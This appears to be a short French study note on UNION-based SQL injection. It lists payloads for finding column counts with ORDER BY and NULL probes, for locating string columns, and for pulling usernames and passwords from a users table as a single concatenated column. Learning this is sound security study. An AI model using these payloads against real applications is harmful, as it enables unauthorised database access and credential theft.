Permet d'exécuter plus d'une requête et de concaténer les résultats
* Doit avoir le même nombre de colonnes entre les requêtes
* les types de données doivent être compatibles
	
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

	
# Trouver le nombre de colonnes
ORDER BY X où est le numéro de la colonne pas d'erreur tant que <= nb colonnes
```
	'ORDER BY 1-- 
	'ORDER BY 2-- 
	...
	Jusqu'à une erreur
```
	
UNION SELECT NULL avec un nombre de null. Cause une erreur si pas égale au nombre de colonnes
```
	' UNION SELECT NULL-- 
	' UNION SELECT NULL,NULL-- 
	' UNION SELECT NULL,NULL,NULL--
	...
```
Sous Oracle ajouter ```FROM dual```


	
# Trouver le type de données
Utiliser un string litéral pour trouver les collones ayant un type string. Pas d'erreur si c'est bon.
```
	‘UNION SELECT ’a',NULL,NULL,NULL--
	‘UNION SELECT NULL,'a',NULL,NULL--
	‘UNION SELECT NULL,NULL,'a',NULL--
	‘UNION SELECT NULL,NULL,NULL,'a'--
```
# Retourner plusieurs collones avec une seule
concatène les strings avec ~ entre les 2
```
‘ UNION SELECT NULL, username || ‘~’ || password FROM users--
```